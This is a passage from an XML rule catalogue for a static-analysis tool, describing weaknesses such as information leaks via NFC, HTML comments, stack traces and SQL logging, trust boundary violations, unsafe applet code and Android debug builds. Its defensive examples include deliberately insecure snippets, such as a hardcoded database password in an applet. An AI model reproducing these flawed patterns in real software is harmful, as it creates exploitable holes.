byte[0], text.getBytes());<br>NdefRecord[] records = { record };<br>NdefMessage msg = new NdefMessage(records);<br>nfcAdapter.setNdefPushMessage(msg, this);<br>...<br></pre><br><br>NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 497</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[13] Ernst Haselsteiner and Klemens Breitfuss <em>Security in Near Field Communication (NFC): Strengths and Weaknesses</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_system_information_leak_html_comment_in_jsp</key>
		<internalKey>Encapsulation/System Information Leak/HTML Comment in JSP
		</internalKey>
		<name>System Information Leak: HTML Comment in JSP</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Any information revealed in an HTML comment might help an adversary learn about the system and form a plan of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  HTML comments provide an attacker with an easy source of information about a dynamically generated web page.<br><br><b>Example 1:</b><br><br><pre><br>&lt;!-- TBD: this needs a security audit --&gt;<br>&lt;form method="POST" action="recalcOrbit"&gt;<br>...<br></pre><br><br>Even comments that seem innocuous may be useful to someone trying to understand the way the system is built.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 615</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_system_information_leak_incomplete_servlet_error_handling
		</key>
		<internalKey>Encapsulation/System Information Leak/Incomplete Servlet
			Error Handling
		</internalKey>
		<name>System Information Leak: Incomplete Servlet Error Handling
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  If a Servlet fails to catch all exceptions, it might reveal debugging information that will help an adversary form a plan of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When a Servlet throws an exception, the default error response the Servlet container sends back to the user typically includes debugging information. This information is of great value to an attacker. For example, a stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.<br><br><b>Example 1:</b> In the following method a DNS lookup failure will cause the Servlet to throw an exception.<br><br><pre><br>protected void doPost (HttpServletRequest req,<br>                    HttpServletResponse res)<br>              throws IOException {<br>    String ip = req.getRemoteAddr();<br>    InetAddress addr = InetAddress.getByName(ip);<br>    ...<br>    out.println("hello " + addr.getHostName());<br>}<br></pre><br><br><b>Example 2:</b> The following method will throw a <code>NullPointerException</code> if the parameter "name" is not part of the request.<br><br><pre><br>protected void doPost (HttpServletRequest req,<br>                    HttpServletResponse res)<br>              throws IOException {<br>    String name = getParameter("name");<br>    ...<br>    out.println("hello " + name.trim());<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 209, CWE ID 431</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[9] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 209</em> <br></p>
																									   <p>[10] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 209</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_system_information_leak_internal</key>
		<internalKey>Encapsulation/System Information Leak/Internal
		</internalKey>
		<name>System Information Leak: Internal</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An internal information leak occurs when system data or debugging information is sent to a local file, console, or screen via printing or logging.<br><br><br><br><b>Example 1:</b> The following code prints an exception to the standard error stream:<br><br><pre><br>try {<br>    ...<br>} catch (Exception e) {<br>    e.printStackTrace();<br>}<br></pre><br><br>Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.<br><br>In the mobile world, information leaks are also a concern.<br><br><b>Example 2:</b> The code below logs the stack trace of a caught exception on the Android platform.<br><pre><br>...<br>try {<br>  ...<br>} catch (Exception e) {<br>    Log.e(TAG, Log.getStackTraceString(e));<br>}<br>...<br></pre><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 497</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_system_information_leak_overly_broad_sql_logging
		</key>
		<internalKey>Encapsulation/System Information Leak/Overly Broad SQL
			Logging
		</internalKey>
		<name>System Information Leak: Overly Broad SQL Logging</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Logging too much information about SQL queries can leak system information or compromise private user data.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  SQL queries should not be logged in production systems. SQL queries often contain sensitive information, such as credit card details or social security numbers, and logging this information in plain text can compromise its confidentiality.<br><br><b>Example 1:</b> The following entries from <code>log4j.properties</code> file causes all queries to be logged at the <code>info</code> level.<br><pre><br>...<br>log4j.logger.net.sf.hibernate.type=info<br>log4j.logger.net.sf.hibernate.tool.hbm2ddl=info<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>AU</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 497</em> <br></p>
																									   <p>[10] Red Hat Middleware, LLC <em>Hibernate Reference Documentation</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.5</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.5.6</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_trust_boundary_violation</key>
		<internalKey>Encapsulation/Trust Boundary Violation</internalKey>
		<name>Trust Boundary Violation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Commingling trusted and untrusted data in the same data structure encourages programmers to mistakenly trust unvalidated data.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary--to move from untrusted to trusted.<br><br>A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. The most common way to make this mistake is to allow trusted and untrusted data to commingle in the same data structure.<br><br><br><br><b>Example:</b> The following Java code accepts an HTTP request and stores the <code>usrname</code> parameter in the HTTP session object before checking to ensure that the user has been authenticated.<br><br><pre><br>usrname = request.getParameter("usrname");<br>if (session.getAttribute(ATTR_USR) == null) {<br>    session.setAttribute(ATTR_USR, usrname);<br>}<br></pre><br><br>Without well-established and maintained trust boundaries, programmers will inevitably lose track of which pieces of data have been validated and which have not. This confusion will eventually allow some data to be used without first being validated.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 501</em> <br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[13] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_unsafe_mobile_code_access_violation</key>
		<internalKey>Encapsulation/Unsafe Mobile Code/Access Violation
		</internalKey>
		<name>Unsafe Mobile Code: Access Violation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program violates secure coding principles for mobile code by returning a <code>private</code> array variable from a <code>public</code> access method. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Returning a <code>private</code> array variable from a <code>public</code> access method allows the calling code to modify the contents of the array, effectively giving the array <code>public</code> access and contradicting the intentions of the programmer who made it <code>private</code>.<br><br><b>Example 1:</b> The following Java Applet code mistakenly returns a <code>private</code> array variable from a <code>public</code> access method.<br><br><pre><br>public final class urlTool extends Applet {<br>private URL[] urls;<br>public URL[] getURLs() {<br>	return urls;<br>}<br>	...<br>}<br></pre><br><br>Mobile code, in this case a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your program is running.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 495</em> <br></p>
																									   <p>[3] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[4] G. McGraw <em>Securing Java. Chapter 7: Java Security Guidelines</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_unsafe_mobile_code_database_access</key>
		<internalKey>Encapsulation/Unsafe Mobile Code/Database Access
		</internalKey>
		<name>Unsafe Mobile Code: Database Access</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Applets that perform JDBC database operations in an untrusted environment can compromise database credentials.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  By default, Java Applets are allowed to open database connections back to the server from which they are downloaded. In trusted environments, this is acceptable, however, in untrusted environments attackers could use the Applet to discover database credentials and ultimately gain access to the database directly.<br><br><br><b>Example 1:</b> The following code shows a hardcoded database password being used in an applet.<br><pre><br>public class CustomerServiceApplet extends JApplet<br>{<br>    public void paint(Graphics g)<br>    {<br>        ...<br>        conn = DriverManager.getConnection ("jdbc:mysql://db.example.com/customerDB", "csr", "p4ssw0rd");<br>        ...<br></pre><br><br>Users of an Applet with hardcoded JDBC credentials can easily discover the credentials since Applet code is downloaded to the client. Furthermore, if the database connection is made over an unencrypted channel, anyone capable of sniffing traffic on the network can also obtain the credentials. Finally, allowing users to connect directly to a database reveals the presence of a publicly accessible database server, which allows attackers to target the database for direct network attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 305</em> <br></p>
																									   <p>[3]  <em>JDBC Guide: Getting Started - Security Considerations</em> Sun Microsystems, Inc.<br></p>
																									   <p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_unsafe_mobile_code_inner_class</key>
		<internalKey>Encapsulation/Unsafe Mobile Code/Inner Class
		</internalKey>
		<name>Unsafe Mobile Code: Inner Class</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program violates secure coding principles for mobile code by making use of an inner class.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Inner classes quietly introduce several security concerns because of the way they are translated into Java bytecode. In Java source code, it appears that an inner class can be declared to be accessible only by the enclosing class, but Java bytecode has no concept of an inner class, so the compiler must transform an inner class declaration into a peer class with <code>package</code> level access to the original outer class. More insidiously, since an inner class can access <code>private</code> fields in their enclosing class, once an inner class becomes a peer class in bytecode, the compiler converts <code>private</code> fields accessed by the inner class into <code>protected</code> fields.<br><br><b>Example 1:</b> The following Java Applet code mistakenly makes use of an inner class.<br><br><pre><br>public final class urlTool extends Applet {<br>private final class urlHelper {<br>	...<br>}<br>	...<br>}<br></pre><br><br>Mobile code, in this case a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your program is running.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 492</em> <br></p>
																									   <p>[3] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[4] G. McGraw <em>Securing Java. Chapter 7: Java Security Guidelines</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_unsafe_mobile_code_public_finalize___method</key>
		<internalKey>Encapsulation/Unsafe Mobile Code/Public finalize() Method
		</internalKey>
		<name>Unsafe Mobile Code: Public finalize() Method</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program violates secure coding principles for mobile code by declaring a <code>finalize()</code>method <code>public</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A program should never call finalize explicitly, except to call <code>super.finalize()</code> inside an implementation of <code>finalize()</code>. In mobile code situations, the otherwise error prone practice of manual garbage collection can become a security threat if an attacker can maliciously invoke one of your <code>finalize()</code> methods because it is declared with <code>public</code> access. If you are using <code>finalize()</code> as it was designed, there is no reason to declare <code>finalize()</code> with anything other than <code>protected</code> access.<br><br><b>Example 1:</b> The following Java Applet code mistakenly declares a <code>public finalize()</code> method.<br><br><pre><br>public final class urlTool extends Applet {<br>public void finalize() {<br>	...<br>}<br>	...<br>}<br></pre><br><br>Mobile code, in this case a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your program is running.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 583</em> <br></p>
																									   <p>[3] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[4] G. McGraw <em>Securing Java. Chapter 7: Java Security Guidelines</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_unsafe_mobile_code_unsafe_array_declaration</key>
		<internalKey>Encapsulation/Unsafe Mobile Code/Unsafe Array Declaration
		</internalKey>
		<name>Unsafe Mobile Code: Unsafe Array Declaration</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program violates secure coding principles for mobile code by declaring an array <code>public</code>, <code>final</code> and <code>static</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  In most cases an array declared <code>public</code>, <code>final</code> and <code>static</code> is a bug. Because arrays are mutable objects, the <code>final</code> constraint requires that the array object itself be assigned only once, but makes no guarantees about the values of the array elements. Since the array is public, a malicious program can change the values stored in the array. In most situations the array should be made <code>private</code>.<br><br><b>Example 1:</b> The following Java Applet code mistakenly declares an array <code>public</code>, <code>final</code> and <code>static</code>.<br><br><pre><br>public final class urlTool extends Applet {<br>public final static URL[] urls;<br>	...<br>}<br></pre><br><br>Mobile code, in this case a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your program is running.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 582</em> <br></p>
																									   <p>[3] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[4] G. McGraw <em>Securing Java. Chapter 7: Java Security Guidelines</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>encapsulation_unsafe_mobile_code_unsafe_public_field</key>
		<internalKey>Encapsulation/Unsafe Mobile Code/Unsafe Public Field
		</internalKey>
		<name>Unsafe Mobile Code: Unsafe Public Field</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program violates secure coding principles for mobile code by declaring a member variable <code>public</code> but not <code>final</code>. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  All <code>public</code> member variables in an Applet and in classes used by an Applet should be declared <code>final</code> to prevent an attacker from manipulating or gaining unauthorized access to the internal state of the Applet.<br><br><b>Example 1:</b> The following Java Applet code mistakenly declares a member variable <code>public</code> but not <code>final</code>.<br><br><pre><br>public final class urlTool extends Applet {<br>public URL url;<br>	...<br>}<br></pre><br><br>Mobile code, in this case a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your program is running.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[2] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 493</em> <br></p>
																									   <p>[3] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[4] G. McGraw <em>Securing Java. Chapter 7: Java Security Guidelines</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>encapsulation</tag>
	</rule>
	<rule>
		<key>environment_android_misconfiguration_debug_information</key>
		<internalKey>Environment/Android Misconfiguration/Debug Information
		</internalKey>
		<name>Android Misconfiguration: Debug Information</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Debugging messages help attackers learn about the system and plan a form of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Android applications can be configured to produce debug binaries. These binaries give detailed debugging messages and should not be used in production environments. The <code>debuggable</code> attribute of the <code>&lt;application&gt;</code> tag defines whether compiled binaries should include debugging information.<br><br>The use of debug binaries causes an application to provide as much information about itself as possible to the user. Debug binaries are meant to be used in a development or testing environment and can pose a security risk if they are deployed to production. Attackers can leverage the additional information they gain from debugging output to mount attacks targeted on the framework, database, or other resources used by the application.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
